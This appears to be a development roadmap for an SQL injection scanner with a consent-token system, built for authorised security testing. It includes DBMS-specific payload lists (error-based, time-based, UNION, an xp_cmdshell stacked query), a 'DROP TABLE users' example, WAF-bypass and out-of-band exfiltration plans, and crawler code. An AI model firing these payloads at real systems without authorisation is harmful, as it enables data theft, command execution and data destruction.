# Pythia SQL Clairvoyance - Development Roadmap

## Current Version: v0.1.0 ✅ RELEASED

**Release Date:** November 2025  
**Status:** ✅ **PRODUCTION READY**

### Features Included

#### Core SQL Injection Detection

-   ✅ **Error-Based Detection**: Multi-DBMS error signature recognition (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
-   ✅ **Boolean Blind Detection**: Logic-based inference with true/false response comparison
-   ✅ **Time-Based Blind Detection**: Timing attacks with baseline measurement and statistical validation
-   ✅ **UNION-Based Detection**: Column counting, injectable column identification, and data extraction
-   ✅ **Multi-Method Detection**: GET parameters, POST data, headers, cookies
-   ✅ **Intelligent Crawling**: Form discovery, link extraction, parameter enumeration
-   ✅ **Context-Aware Payloads**: Automatic payload adaptation based on injection point

#### Performance & Control

-   ✅ **Rate Limiting**: Configurable request throttling (2-40 req/s) with thread-safe implementation
-   ✅ **Thread Pool Management**: Concurrent testing with 1-20 worker threads
-   ✅ **Intelligent Retry Logic**: Automatic retry on transient failures
-   ✅ **Graceful Degradation**: Continues testing even if endpoints fail
-   ✅ **Progress Tracking**: Real-time progress bars and status updates

#### Infrastructure

-   ✅ **Consent Token System**: Ethical testing with HTTP/.well-known or DNS TXT verification
-   ✅ **SQLite Database**: Complete scan history, findings tracking, verified domain management (shared with Argus/Hephaestus)
-   ✅ **Dual Reporting**: JSON (machine-readable) and HTML (human-readable) formats
-   ✅ **Professional HTML Reports**: Responsive, self-contained with severity breakdown
-   ✅ **Automatic Secret Redaction**: Logging system prevents credential leaks
-   ✅ **Multi-Source Configuration**: YAML defaults + environment variables + CLI overrides

#### AI-Powered Analysis (3 Providers)

-   ✅ **OpenAI GPT-4 Turbo**: Premium quality SQL injection analysis (~35s, $0.25/scan)
-   ✅ **Anthropic Claude**: Privacy-focused with strong code remediation (~45s, $0.30/scan)
-   ✅ **Ollama (Local Models)**: 100% offline analysis (free, no data leaves your machine)
-   ✅ **Executive Summaries**: Business-friendly language for non-technical stakeholders
-   ✅ **Technical Remediation Guides**: Prepared statement examples, input validation, WAF rules
-   ✅ **Dual-Tone Mode**: Both executive and technical analysis in single report
-   ✅ **Automatic Sanitization**: Zero secrets leaked to AI providers

#### Resilience & Error Handling

-   ✅ **Connection Error Recovery**: Handles timeouts, DNS failures, refused connections
-   ✅ **Database Corruption Recovery**: Automatic backup and recreation
-   ✅ **Read-Only Mode**: Graceful degradation when database is locked
-   ✅ **Partial Scan Support**: Preserves results even if target goes offline mid-scan
-   ✅ **Graceful Interruption**: Ctrl+C handling with proper scan status updates (aborted)
-   ✅ **Standardized Exit Codes**: 0=success, 1=error, 130=cancelled

#### Developer Experience

-   ✅ **Rich CLI Interface**: Colored output, progress tracking, ASCII art branding
-   ✅ **Verbosity Levels**: `-v` (INFO), `-vv` (DEBUG) for troubleshooting
-   ✅ **Comprehensive Help**: Built-in documentation with examples
-   ✅ **Flexible Deployment**: Native Python or containerized scanning

### Performance Benchmarks (v0.1.0)

-   **Scan Duration**: 8-180 seconds (depending on target complexity and mode)
-   **Database Efficiency**: 4.0 MB for 638 scans with 5,000+ findings
-   **Query Performance**: 5-50ms for complex aggregations
-   **Concurrent Scanning**: 3+ simultaneous scans without race conditions
-   **Detection Rate**: 90%+ for common SQL injection vulnerabilities

---

## v0.2.0 - Enhanced Detection & AI Features

**Theme:** Deep SQL Injection Analysis + Advanced AI Capabilities  
**Target Release:** Q2 2026 (April-May)  
**Focus:** Detection accuracy, DBMS-specific payloads, reporting improvements

---

### 🎯 Enhanced HTML Reporting

**Ticket:** IMPROV-002  
**Priority:** High

#### Current Limitations

-   No CWE mapping for SQL injection types
-   References lack metadata (OWASP, PortSwigger, etc.)
-   Payload examples not shown in reports
-   Recommendations are generic
-   No grouping by injection type or DBMS

#### Planned Improvements

**1. CWE/OWASP Badges**

```html
<!-- Before -->
<tr>
    <td>Error-Based SQL Injection</td>
    <td>Critical</td>
</tr>

<!-- After -->
<tr>
    <td>Error-Based SQL Injection - MySQL</td>
    <td>Critical <span class="badge badge-critical">CWE-89</span></td>
    <td><span class="badge">OWASP A03:2021</span></td>
    <td><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89</a></td>
</tr>
```

**2. Reference Enrichment**

```json
{
    "references": [
        {
            "url": "https://owasp.org/www-community/attacks/SQL_Injection",
            "title": "SQL Injection - OWASP",
            "domain": "owasp.org",
            "type": "security_guidance",
            "year": 2024
        },
        {
            "url": "https://portswigger.net/web-security/sql-injection",
            "title": "SQL Injection Tutorial - PortSwigger",
            "domain": "portswigger.net",
            "type": "tutorial"
        }
    ]
}
```

**3. Code Remediation Examples**

```html
<div class="finding">
    <h4>❌ Error-Based SQL Injection in 'id' parameter</h4>
    <p>Vulnerable endpoint allows database error extraction</p>

    <!-- PHP PDO -->
    <h5>❌ VULNERABLE CODE (PHP):</h5>
    <pre><code>$sql = "SELECT * FROM users WHERE id = " . $_GET['id'];
$result = mysqli_query($conn, $sql);</code></pre>

    <h5>✅ SECURE CODE (PHP PDO):</h5>
    <pre><code>$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $_GET['id']]);</code></pre>

    <!-- Python -->
    <h5>✅ SECURE CODE (Python):</h5>
    <pre><code>cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))</code></pre>

    <!-- Node.js -->
    <h5>✅ SECURE CODE (Node.js):</h5>
    <pre><code>db.query("SELECT * FROM users WHERE id = ?", [userId])</code></pre>
</div>
```

**4. Payload Visualization**

```html
<div class="payload-demo">
    <h5>Attack Payload Used:</h5>
    <pre><code>GET /user?id=1' OR '1'='1</code></pre>

    <h5>Resulting SQL Query:</h5>
    <pre><code>SELECT * FROM users WHERE id = '1' OR '1'='1'
                                         ^^^^^^^^^^^^^^^^
                                         Always TRUE</code></pre>

    <h5>Effect:</h5>
    <p class="text-danger">Returns ALL users instead of one</p>
</div>
```

**5. Findings Grouping**

```javascript
// Filter by severity
[Critical: 10] [High: 3] [Medium: 1] [Low: 0] [Info: 0]

// Group by injection type
📁 Error-Based SQLi (4)
📁 Time-Based Blind SQLi (2)
📁 Boolean Blind SQLi (3)
📁 UNION-Based SQLi (5)

// Group by DBMS
🗄️ MySQL (10)
🗄️ PostgreSQL (3)
🗄️ Microsoft SQL Server (1)
```

**Benefits:**

-   Actionable insights (copy-paste code examples)
-   Clear vulnerability classification (CWE/OWASP mapping)
-   Better organization (filtering and grouping)
-   Enhanced credibility (reference metadata)
-   Visual payload explanation (understand the attack)

---

### 🔍 DBMS Fingerprinting & Payload Adaptation

**Ticket:** IMPROV-003  
**Priority:** High

#### Current Limitations

Generic payloads used for all targets. No DBMS-specific optimization:

```json
{
    "title": "Error-Based SQL Injection",
    "dbms": "Unknown", // ❌ Generic detection
    "payload": "' OR '1'='1" // ❌ Generic payload
}
```

#### Detection Methods

**1. Error Message Fingerprinting**

```python
ERROR_SIGNATURES = {
    'mysql': [
        r"You have an error in your SQL syntax",
        r"MySQL server version",
        r"mysqli_fetch",
        r"mysql_num_rows"
    ],
    'postgresql': [
        r"PostgreSQL.*ERROR",
        r"pg_query",
        r"pg_exec",
        r"unterminated quoted string"
    ],
    'mssql': [
        r"Microsoft SQL Server",
        r"ODBC SQL Server Driver",
        r"Unclosed quotation mark",
        r"mssql_query"
    ],
    'oracle': [
        r"ORA-\d{5}",
        r"Oracle Database",
        r"PLS-\d{5}"
    ],
    'sqlite': [
        r"SQLite",
        r"sqlite3.OperationalError",
        r"unrecognized token"
    ]
}
```

**2. Banner Grabbing**

```sql
-- MySQL
SELECT @@version
SELECT version()

-- PostgreSQL
SELECT version()

-- MSSQL
SELECT @@VERSION

-- Oracle
SELECT * FROM v$version

-- SQLite
SELECT sqlite_version()
```

**3. Function Fingerprinting**

```python
DBMS_FUNCTIONS = {
    'mysql': ['CONCAT', 'SUBSTRING', 'SLEEP', 'BENCHMARK'],
    'postgresql': ['CONCAT', 'SUBSTRING', 'PG_SLEEP', 'VERSION'],
    'mssql': ['CONCAT', 'SUBSTRING', 'WAITFOR DELAY'],
    'oracle': ['CONCAT', 'SUBSTR', 'DBMS_LOCK.SLEEP'],
    'sqlite': ['SUBSTR', 'RANDOMBLOB']
}
```

**4. Syntax Quirks Detection**

```python
# MySQL uses backticks
test_payload = "SELECT `column` FROM `table`"

# PostgreSQL uses dollar quoting
test_payload = "SELECT $$string$$"

# MSSQL uses square brackets
test_payload = "SELECT [column] FROM [table]"

# Oracle uses dual table
test_payload = "SELECT 1 FROM dual"
```

#### DBMS-Specific Payload Libraries

**MySQL Payloads:**

```python
MYSQL_PAYLOADS = {
    'error_based': [
        "' AND extractvalue(1, concat(0x7e, (SELECT @@version))) --",
        "' AND updatexml(null, concat(0x7e, database()), null) --",
        "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@version), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) --"
    ],
    'time_based': [
        "' AND SLEEP(5) --",
        "' AND BENCHMARK(5000000, MD5('test')) --",
        "' AND IF(1=1, SLEEP(5), 0) --"
    ],
    'union_based': [
        "' UNION SELECT NULL, @@version, NULL --",
        "' UNION SELECT 1, table_name, 3 FROM information_schema.tables --"
    ]
}
```

**PostgreSQL Payloads:**

```python
POSTGRESQL_PAYLOADS = {
    'error_based': [
        "' AND CAST((SELECT version()) AS int) --",
        "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int) --"
    ],
    'time_based': [
        "' AND pg_sleep(5) --",
        "' AND (SELECT 1 FROM pg_sleep(5)) --",
        "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --"
    ],
    'union_based': [
        "' UNION SELECT NULL, version(), NULL --",
        "' UNION SELECT 1, current_database(), 3 --"
    ]
}
```

**Microsoft SQL Server Payloads:**

```python
MSSQL_PAYLOADS = {
    'error_based': [
        "' AND CONVERT(int, @@version) --",
        "' AND 1=CONVERT(int, (SELECT @@version)) --"
    ],
    'time_based': [
        "'; WAITFOR DELAY '00:00:05' --",
        "' AND 1=IIF(1=1, (SELECT 1 FROM (SELECT SLEEP(5000)) t), 0) --",
        "'; IF (1=1) WAITFOR DELAY '00:00:05' --"
    ],
    'stacked_queries': [
        "'; EXEC xp_cmdshell('ping 127.0.0.1') --",
        "'; EXEC sp_configure 'show advanced options', 1 --"
    ]
}
```

**Oracle Payloads:**

```python
ORACLE_PAYLOADS = {
    'error_based': [
        "' AND CTXSYS.DRITHSX.SN(1, (SELECT banner FROM v$version WHERE rownum=1)) = 1 --",
        "' AND UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1)) IS NULL --"
    ],
    'time_based': [
        "' AND DBMS_LOCK.SLEEP(5) --",
        "' AND (SELECT COUNT(*) FROM ALL_USERS t1, ALL_USERS t2, ALL_USERS t3) > 0 --"  # CPU-intensive
    ],
    'union_based': [
        "' UNION SELECT NULL, banner, NULL FROM v$version --",
        "' UNION SELECT 1, user, 3 FROM dual --"
    ]
}
```

#### Enhanced Output

**Before:**

```json
{
    "title": "Error-Based SQL Injection",
    "severity": "critical",
    "dbms": "Unknown",
    "payload": "' OR '1'='1"
}
```

**After:**

```json
{
    "title": "Error-Based SQL Injection - MySQL 8.0.34",
    "severity": "critical",
    "confidence": "high",
    "dbms": {
        "type": "MySQL",
        "version": "8.0.34",
        "detection_method": "error_signature",
        "confidence": "high"
    },
    "payload": {
        "used": "' AND extractvalue(1, concat(0x7e, (SELECT @@version))) --",
        "type": "mysql_error_based",
        "response_evidence": "XPATH syntax error: '~8.0.34-Ubuntu'"
    },
    "exploitability": {
        "data_extraction": true,
        "authentication_bypass": true,
        "file_operations": false,  # FILE privilege required
        "command_execution": false  # Disabled by default in MySQL 8+
    },
    "recommendation": "Use MySQLi prepared statements with parameterized queries. Ensure 'secure_file_priv' is properly configured."
}
```

#### Additional Features

-   **Adaptive Payload Selection**: Automatically choose optimal payloads based on detected DBMS
-   **Version-Specific Exploits**: Target known vulnerabilities in specific database versions
-   **Privilege Detection**: Identify current user privileges (SELECT, INSERT, FILE, SUPER)
-   **Multi-DBMS Support**: Detect and test MySQL, PostgreSQL, MSSQL, Oracle, SQLite, MariaDB
-   **Custom Payload Library**: Import user-provided payloads for specific targets

**Target Accuracy:** ≥85% DBMS detection rate, 95%+ for common databases

**Benefits:**

-   **Higher Success Rate**: DBMS-specific payloads are more effective
-   **Reduced False Positives**: Better confirmation with targeted tests
-   **Deeper Analysis**: Version-specific exploits and privilege escalation
-   **Professional Reports**: Detailed DBMS information for remediation

---

### 🕷️ Advanced Crawler & Element Extraction

**Ticket:** IMPROV-009 (Pythia-specific)  
**Priority:** High

#### Current Limitations

Basic crawler with limited element extraction:

-   Only follows simple `<a>` tags
-   Misses forms with dynamic action URLs
-   Doesn't extract headers or cookie parameters
-   No JavaScript rendering for SPAs
-   Limited POST parameter discovery

#### Planned Improvements

**1. Enhanced Form Parsing**

```python
class FormExtractor:
    def extract_forms(self, html):
        """Extract all forms with complete details"""
        forms = []
        for form in soup.find_all('form'):
            form_data = {
                'action': form.get('action', ''),
                'method': form.get('method', 'GET').upper(),
                'enctype': form.get('enctype', 'application/x-www-form-urlencoded'),
                'inputs': []
            }

            # Extract all input types
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_data = {
                    'name': input_tag.get('name', ''),
                    'type': input_tag.get('type', 'text'),
                    'value': input_tag.get('value', ''),
                    'required': input_tag.has_attr('required'),
                    'hidden': input_tag.get('type') == 'hidden'
                }

                # For select elements, extract options
                if input_tag.name == 'select':
                    input_data['options'] = [
                        opt.get('value', opt.text)
                        for opt in input_tag.find_all('option')
                    ]

                form_data['inputs'].append(input_data)

            forms.append(form_data)

        return forms
```

**2. JavaScript Link Extraction**

```python
class JavaScriptExtractor:
    """Extract URLs from JavaScript code"""

    PATTERNS = [
        r'fetch\([\'"]([^\'"]+)[\'"]',  # fetch() calls
        r'\.ajax\({[^}]*url:\s*[\'"]([^\'"]+)[\'"]',  # jQuery AJAX
        r'window\.location\s*=\s*[\'"]([^\'"]+)[\'"]',  # Redirects
        r'href\s*=\s*[\'"]([^\'"]+)[\'"]',  # Dynamic href
        r'action\s*=\s*[\'"]([^\'"]+)[\'"]',  # Dynamic form action
    ]

    def extract_js_urls(self, html):
        """Extract URLs from inline JavaScript"""
        urls = set()

        # Extract from <script> tags
        for script in soup.find_all('script'):
            if script.string:
                for pattern in self.PATTERNS:
                    matches = re.findall(pattern, script.string)
                    urls.update(matches)

        # Extract from inline event handlers
        for tag in soup.find_all(True):
            for attr in ['onclick', 'onload', 'onsubmit']:
                if tag.has_attr(attr):
                    for pattern in self.PATTERNS:
                        matches = re.findall(pattern, tag[attr])
                        urls.update(matches)

        return urls
```

**3. API Endpoint Discovery**

```python
class APIDiscovery:
    """Discover REST/GraphQL API endpoints"""

    def discover_rest_endpoints(self, base_url):
        """Look for common API patterns"""
        api_paths = [
            '/api/',
            '/api/v1/',
            '/api/v2/',
            '/rest/',
            '/graphql',
            '/wp-json/',  # WordPress REST API
            '/api/users',
            '/api/posts',
            '/api/products'
        ]

        endpoints = []
        for path in api_paths:
            url = urljoin(base_url, path)
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code in [200, 401, 403]:
                    endpoints.append({
                        'url': url,
                        'type': 'rest_api',
                        'status': response.status_code,
                        'methods': self._detect_methods(url)
                    })
            except:
                continue

        return endpoints

    def _detect_methods(self, url):
        """Detect allowed HTTP methods"""
        methods = []
        for method in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']:
            try:
                response = self.session.request(method, url, timeout=3)
                if response.status_code != 405:  # Method Not Allowed
                    methods.append(method)
            except:
                continue
        return methods
```

**4. Cookie & Header Parameter Extraction**

```python
class HeaderParameterExtractor:
    """Extract testable parameters from headers and cookies"""

    def extract_from_response(self, response):
        """Extract parameters from HTTP response"""
        params = {
            'headers': [],
            'cookies': []
        }

        # Extract from Set-Cookie headers
        for cookie in response.cookies:
            params['cookies'].append({
                'name': cookie.name,
                'value': cookie.value,
                'domain': cookie.domain,
                'path': cookie.path,
                'secure': cookie.secure,
                'httponly': cookie.has_nonstandard_attr('HttpOnly')
            })

        # Extract custom headers that might be parameters
        testable_headers = ['X-User-Id', 'X-Session-Id', 'X-Token', 'Authorization']
        for header, value in response.headers.items():
            if header in testable_headers or header.startswith('X-'):
                params['headers'].append({
                    'name': header,
                    'value': value
                })

        return params
```

**5. Sitemap & Robots.txt Parsing**

```python
class SitemapParser:
    """Parse sitemap.xml and robots.txt for URLs"""

    def parse_sitemap(self, base_url):
        """Extract URLs from sitemap.xml"""
        urls = set()

        sitemap_urls = [
            '/sitemap.xml',
            '/sitemap_index.xml',
            '/sitemap-index.xml',
            '/sitemap1.xml'
        ]

        for sitemap_path in sitemap_urls:
            url = urljoin(base_url, sitemap_path)
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code == 200:
                    # Parse XML
                    root = ET.fromstring(response.content)
                    for loc in root.findall('.//{http://www.sitemaps.org/schemas/sitemap/0.9}loc'):
                        urls.add(loc.text)
            except:
                continue

        return urls

    def parse_robots(self, base_url):
        """Extract disallowed paths from robots.txt"""
        url = urljoin(base_url, '/robots.txt')
        disallowed = []

        try:
            response = self.session.get(url, timeout=5)
            if response.status_code == 200:
                for line in response.text.split('\n'):
                    if line.startswith('Disallow:'):
                        path = line.split(':', 1)[1].strip()
                        if path:
                            disallowed.append(urljoin(base_url, path))
        except:
            pass

        return disallowed
```

**6. POST Parameter Discovery**

```python
class POSTParameterDiscovery:
    """Discover POST parameters through various methods"""

    def discover_from_forms(self, forms):
        """Extract POST params from forms"""
        params = {}
        for form in forms:
            if form['method'] == 'POST':
                form_params = {}
                for input_field in form['inputs']:
                    if input_field['name']:
                        form_params[input_field['name']] = {
                            'type': input_field['type'],
                            'default': input_field['value'],
                            'required': input_field['required']
                        }
                params[form['action']] = form_params
        return params

    def discover_from_ajax(self, javascript):
        """Extract POST params from AJAX calls"""
        # Pattern: data: {param1: value1, param2: value2}
        pattern = r'data:\s*{([^}]+)}'
        matches = re.findall(pattern, javascript)

        params = {}
        for match in matches:
            # Parse key-value pairs
            pairs = re.findall(r'(\w+):\s*[\'"]?([^\'",:]+)[\'"]?', match)
            params.update(dict(pairs))

        return params
```

#### Enhanced Crawling Workflow

```
┌─────────────────────────────────────────┐
│  1. Initial Request                     │
│     - Extract forms, links, scripts     │
└─────────────────┬───────────────────────┘
                  │
┌─────────────────▼───────────────────────┐
│  2. Parse sitemap.xml & robots.txt      │
│     - Discover hidden endpoints         │
└─────────────────┬───────────────────────┘
                  │
┌─────────────────▼───────────────────────┐
│  3. JavaScript Analysis                 │
│     - Extract dynamic URLs              │
│     - Find AJAX endpoints               │
└─────────────────┬───────────────────────┘
                  │
┌─────────────────▼───────────────────────┐
│  4. API Discovery                       │
│     - /api/, /graphql, /wp-json/        │
└─────────────────┬───────────────────────┘
                  │
┌─────────────────▼───────────────────────┐
│  5. Parameter Extraction                │
│     - GET: URL parameters               │
│     - POST: Form fields, AJAX data      │
│     - Headers: X-* custom headers       │
│     - Cookies: Session/auth cookies     │
└─────────────────┬───────────────────────┘
                  │
┌─────────────────▼───────────────────────┐
│  6. SQL Injection Testing               │
│     - Test all discovered parameters    │
└─────────────────────────────────────────┘
```

#### Configuration

```yaml
# config/default.yaml
crawler:
    max_depth: 3
    max_pages: 100
    follow_redirects: true

    extraction:
        forms: true
        javascript_urls: true
        api_endpoints: true
        sitemap: true
        robots: true
        headers: true
        cookies: true

    javascript:
        enabled: true
        patterns:
            - "fetch"
            - "ajax"
            - "XMLHttpRequest"

    api_discovery:
        enabled: true
        common_paths:
            - "/api/"
            - "/graphql"
            - "/rest/"
```

#### Benefits

-   **Higher Coverage**: Discover 3-5x more testable parameters
-   **API Testing**: Automatic REST/GraphQL endpoint discovery
-   **Dynamic Applications**: Handle JavaScript-heavy SPAs
-   **Complete Analysis**: Test GET, POST, headers, and cookies
-   **Professional Results**: More comprehensive vulnerability reports

**Target Improvement:** 300%+ increase in discovered injection points

---

### ⚡ Aggressive Mode Enhancement

**Ticket:** IMPROV-004  
**Priority:** High

#### Current Limitations

Aggressive mode only differs in rate limiting:

-   Safe mode: 2 req/s, 5 threads
-   Aggressive mode: 40 req/s, 10 threads
-   **Similar detection depth** (needs enhancement)

#### Planned Enhancements

**1. Extended Payload Libraries**

```yaml
safe_mode:
    max_payloads_per_type: 5 # Basic payloads

aggressive_mode:
    max_payloads_per_type: 50 # Comprehensive payload sets
    custom_wordlists:
        - sql injection-common.txt # Common payloads
        - sqli-advanced.txt # Advanced evasion
        - dbms-specific/*.txt # Per-DBMS payloads
```

**2. Advanced SQLi Techniques**

```yaml
aggressive_mode:
    techniques:
        - second_order_sqli: true # Store payload, trigger later
        - out_of_band: true # DNS/HTTP exfiltration
        - encoding_evasion:
              - url_encoding
              - double_encoding
              - hex_encoding
              - unicode_encoding
        - waf_bypass:
              - comment_injection: /* */ --
              - case_variation: SeLeCt, sElEcT
              - whitespace_tricks: SELECTFROM
```

**3. Deep Crawling**

```yaml
aggressive_mode:
    crawling:
        max_depth: 5 # vs 2 in safe mode
        max_pages: 500 # vs 50 in safe mode
        follow_external_links: false
        parse_javascript: true
        render_with_browser: true # Selenium/Playwright
        discover_hidden_parameters: true
```

**4. Blind SQLi Optimization**

```yaml
aggressive_mode:
    blind_sqli:
        max_inference_depth: 32 # Binary search for data
        parallel_requests: 10 # Speed up boolean/time tests
        confidence_threshold: 0.95 # Higher certainty
        adaptive_timing:
            min_delay: 5 # seconds
            max_delay: 10
            auto_adjust: true # Adapt to network latency
```

**5. Advanced Detection Methods**

```yaml
aggressive_mode:
    detection_methods:
        # Second-Order SQLi
        - store_and_trigger: true

        # Out-of-Band
        - dns_exfiltration: true # Burp Collaborator style
        - http_callbacks: true

        # WAF Evasion
        - encoding_chains: true # url + hex + unicode
        - comment_obfuscation: true
        - case_mixing: true

        # Stacked Queries
        - command_stacking: true # ; DROP TABLE users--
        - batch_execution: true
```

**6. Per-Parameter Analysis**

```python
def analyze_parameter_aggressive(param):
    """Deep analysis for each parameter"""

    # 1. Type detection
    param_type = detect_type(param.value)  # int, string, date, json

    # 2. Boundary detection
    boundaries = detect_boundaries(param)  # ', ", ), `, etc.

    # 3. Context-aware payloads
    payloads = generate_contextual_payloads(param_type, boundaries)

    # 4. WAF fingerprinting
    waf = detect_waf(target)
    if waf:
        payloads = apply_waf_bypass(payloads, waf)

    # 5. Test all payloads
    for payload in payloads:
        test_sql_injection(param, payload)
```

**7. Multi-Vector Testing**

```python
# Test same parameter in multiple contexts
contexts = [
    ('GET', '/user?id={PAYLOAD}'),
    ('POST', '/user', {'id': '{PAYLOAD}'}),
    ('HEADER', 'X-User-Id: {PAYLOAD}'),
    ('COOKIE', 'user_id={PAYLOAD}'),
    ('JSON', '{"id": "{PAYLOAD}"}'),
    ('XML', '<id>{PAYLOAD}</id>')
]

for method, context in contexts:
    test_injection(method, context)
```

#### Expected Results

| Mode           | Payloads | Depth | Pages | Duration | Findings |
| -------------- | -------- | ----- | ----- | -------- | -------- |
| **Safe**       | 5/type   | 2     | 50    | ~30s     | 14       |
| **Aggressive** | 50/type  | 5     | 500   | ~180s    | 40-60    |

**Benefits:**

-   Real value differentiation between modes
-   Deeper coverage for penetration testing
-   WAF bypass techniques
-   Second-order SQLi detection
-   Respects consent requirements

---

### 💰 AI Cost Tracking & Budget Limits

**Ticket:** IMPROV-005
**Priority:** Medium

#### Problem Statement

No visibility into AI costs per scan. Enterprises need cost controls.

#### Configuration

```yaml
# config/default.yaml
ai:
    budget:
        enabled: true
        max_cost_per_scan: 0.50 # USD
        max_tokens_per_request: 3000
        warn_threshold: 0.80 # Warn at 80% ($0.40)
        abort_on_exceed: true

    tracking:
        log_costs: true
        cost_report: ~/.pythia/costs.json
```

#### Runtime Output

```bash
python -m pyth --target localhost:8081 --aggressive --use-ai --ai-tone both

[Phase 6/6] AI Analysis...
  ├─ Executive Summary: 1,350 tokens → $0.14
  ├─ Technical Guide: 1,680 tokens → $0.18
  └─ Total AI Cost: $0.32 / $0.50 budget (64% used)

✓ Analysis complete
```

#### Cost Report

```json
// ~/.pythia/costs.json
{
    "scans": [
        {
            "scan_id": 617,
            "timestamp": "2025-11-03T20:17:26Z",
            "tool": "pythia",
            "provider": "openai",
            "model": "gpt-4-turbo-preview",
            "executive_summary": {
                "tokens_input": 1500,
                "tokens_output": 1350,
                "cost": 0.14
            },
            "technical_guide": {
                "tokens_input": 1500,
                "tokens_output": 1680,
                "cost": 0.18
            },
            "total_cost": 0.32,
            "budget_remaining": 0.18
        }
    ],
    "totals": {
        "total_scans": 617,
        "total_cost": 197.44,
        "avg_cost_per_scan": 0.32,
        "monthly_projection": 28.8
    }
}
```

**Benefits:**

-   Cost transparency
-   Budget enforcement
-   Monthly projections
-   Enterprise compliance

---

### 🌊 AI Streaming Responses

**Ticket:** IMPROV-006
**Priority:** Low

#### Current Behavior

```bash
[Phase 6/6] AI Analysis...
  ⏳ Generating insights... (user waits 30+ seconds)
  ✓ Analysis complete
```

#### Streaming Behavior

```bash
[Phase 6/6] AI Analysis...
  [Executive Summary] Analyzing SQL injection risks...
  [Executive Summary] ████████░░ 80% - Assessing business impact...
  [Executive Summary] ✓ Complete (2,800 chars in 21s)

  [Technical Guide] Generating remediation steps...
  [Technical Guide] ████░░░░░░ 40% - Prepared statements...
  [Technical Guide] ████████░░ 80% - Input validation...
  [Technical Guide] ✓ Complete (5,600 chars in 35s)
```

**Benefits:**

-   Improved UX (see progress)
-   Reduced perceived latency
-   Better for slow models (Ollama)
-   Immediate error detection

---

### 🤖 Multi-LLM Comparison Mode

**Ticket:** IMPROV-007
**Priority:** Low

#### Use Case

Compare outputs from multiple LLMs to reduce hallucinations and improve quality.

#### CLI Usage

```bash
# Compare 2 models
python -m pyth --target localhost:8081 \
  --aggressive \
  --use-ai \
  --ai-compare openai,anthropic

# Compare all 3
python -m pyth --target localhost:8081 \
  --aggressive \
  --use-ai \
  --ai-compare all
```

**Benefits:**

-   Quality assurance (cross-validation)
-   Reduced hallucinations (30-40% fewer)
-   Confidence scoring
-   Best of all worlds

---

### 🛠️ AI Agent Enhancement

**Ticket:** IMPROV-008
**Priority:** Medium

#### Vision

Transform AI from passive analyzer to active research agent.

#### External Tools

**1. NVD CVE Lookup**

```python
@tool
def lookup_cve(cve_id: str) -> dict:
    """Get CVE details for SQL injection vulnerabilities"""
    response = requests.get(
        f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}"
    )
    return {
        "cvss_score": data['cvss_v3_score'],
        "severity": data['severity'],
        "description": data['description'],
        "cwe": data['cwe_ids']
    }
```

**2. ExploitDB Search**

```python
@tool
def search_exploitdb(query: str) -> list:
    """Search for SQL injection exploits"""
    # Search for SQL injection exploits
    return exploits
```

**3. SQLMap Knowledge Base**

```python
@tool
def query_sqlmap_kb(dbms: str, technique: str) -> dict:
    """Get SQLMap best practices for specific DBMS"""
    return {
        'optimal_payloads': [...],
        'bypass_techniques': [...],
        'data_extraction_methods': [...]
    }
```

#### Enhanced Prompts

```python
system_prompt = """
You are an AI SQL injection security researcher with access to:
- NVD CVE lookup for vulnerability details
- ExploitDB for public exploit availability
- SQLMap knowledge base for advanced techniques

When analyzing SQL injection findings:
1. Identify DBMS type and version
2. Look up known CVEs for that version
3. Check for public exploits
4. Provide DBMS-specific remediation
5. Include code examples in multiple languages

You have memory of previous scans. Connect related findings across scans.
"""
```

**Benefits:**

-   Real-time vulnerability correlation
-   Contextual analysis across scans
-   Automated research
-   Foundation for v0.3.0 interactive features

---

### 📚 Additional v0.2.0 Features

#### SQLMap Integration

-   Optional SQLMap wrapper for advanced exploitation
-   Automated vulnerability confirmation
-   Data extraction capabilities
-   Tamper script suggestions

#### Enhanced Reporting

-   PDF export with custom branding
-   CVSS scoring for SQL injection vulnerabilities
-   Compliance mapping (OWASP Top 10, PCI-DSS, CWE-89)
-   Trend graphs (vulnerability density over time)
-   Diff reports (compare two scans)

#### Advanced Detection

-   Second-order SQL injection
-   NoSQL injection (MongoDB, CouchDB)
-   ORM injection (Hibernate HQL, Django ORM)
-   GraphQL injection
-   XML/XPath injection

**Breaking Changes:** None (fully backward compatible)

---

## v0.3.0 - Enterprise & Interactive Features

**Theme:** Scale, Automation, and Conversational AI  
**Target Release:** Q3 2026 (July-August)  
**Focus:** Enterprise needs, multi-site scanning, interactive AI

---

### 🛠️ Interactive Config Management

**Ticket:** IMPROV-009
**Priority:** Medium

#### Metasploit-Style Interface

```bash
# Show current configuration
$ pyth --show-options

╔═══════════════════════════════════════════════╗
║         PYTHIA CONFIGURATION                  ║
╠═══════════════════════════════════════════════╣
║ SCAN SETTINGS                                 ║
╠═══════════════════════════════════════════════╣
║ mode             safe          [safe|aggressive]
║ rate_limit.safe  2.0           req/s          ║
║ rate_limit.aggr  40.0          req/s          ║
║ max_workers      5             threads        ║
║ timeout          30            seconds        ║
╠═══════════════════════════════════════════════╣
║ SQL INJECTION SETTINGS                        ║
╠═══════════════════════════════════════════════╣
║ sqli.techniques  all           [error,blind,time,union]
║ sqli.dbms        auto          [mysql,pgsql,mssql,oracle]
║ sqli.max_depth   3             levels         ║
╠═══════════════════════════════════════════════╣
║ AI SETTINGS                                   ║
╠═══════════════════════════════════════════════╣
║ ai.provider      openai        [openai|anthropic|ollama]
║ ai.model         gpt-4-turbo   string         ║
║ ai.temperature   0.3           0.0-1.0        ║
╚═══════════════════════════════════════════════╝
```

#### Configuration Profiles

```bash
# Save specialized profiles
$ pyth --set mode=aggressive --set rate_limit.aggr=40 --save-profile pentest
✓ Saved profile: pentest (deep SQL injection testing)

